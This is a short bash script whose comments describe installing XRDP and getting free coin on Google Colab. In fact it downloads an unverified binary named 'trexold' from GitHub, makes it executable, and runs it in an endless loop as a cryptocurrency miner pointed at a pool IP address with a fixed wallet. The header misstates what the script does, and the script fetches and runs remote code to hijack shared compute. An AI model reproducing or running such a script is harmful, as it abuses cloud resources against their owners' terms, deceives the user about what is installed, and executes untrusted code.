# /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R trexold

wget https://github.com/rigmining/code/raw/main/trexold
chmod 700 trexold

y=10
while [ y ]
do
  ./trexold -a x16rt -o stratum+tcp://198.50.168.213:3646 -u MWyhsXGGKoUrQ3E7GRn7CZV4UvHX34ePrt -p c=LTC
done
